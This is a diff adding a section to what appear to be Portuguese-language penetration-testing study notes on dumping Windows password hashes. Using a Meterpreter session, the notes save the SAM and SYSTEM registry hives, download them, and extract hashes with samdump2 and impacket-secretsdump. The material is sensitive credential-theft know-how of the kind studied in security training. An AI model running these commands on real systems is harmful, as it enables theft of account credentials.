@@ -65,3 +65,50 @@ rafaela:1005:aa...........................ee == vazio (significa que não está 
 
 Obs: ID = 500 - Corresponde a uma conta de administrador.
 
+
+## Obtendo hashes: Sistemas Antigos
+
+`getuid` - Comando para saber qual o seu nivel de permissão.
+
+C:\WINDOWS\system32\config  - Local onde ficam armazenados as senhas
+
+C:\WINDOWS\repair - Backup das senhas
+
+`download sam` -> comando para fazer download do sam 
+
+`download system` -> comando para fazer download do system 
+
+Obs: o comando download é utilizado dentro do meterpreter
+
+samdump2 - Aplicação para  idenficar os hashs baixados.
+
+Obtendo system e sam diretamente do reg do windows.
+
+`shell`
+
+`C:\> reg /?`
+
+`C:\> reg save hklm\sam samOK`
+
+`C:\> reg save hklm\system systemOK`
+
+`C:\> exit`
+
+`meterpreter> download samOK`
+
+`meterpreter> download systemOK`
+
+`root@kali:/home/# samdump2 systemOK samOK`
+
+Obs: baixar os arquivos direto do reg você baixa o arquvivo mais atualizado.
+
+Outra aplicação para extrair as hashs
+
+`impacket-secretsdump -sam samOK -system -systemOK LOCAL`
+
+
+
+
+
+
+
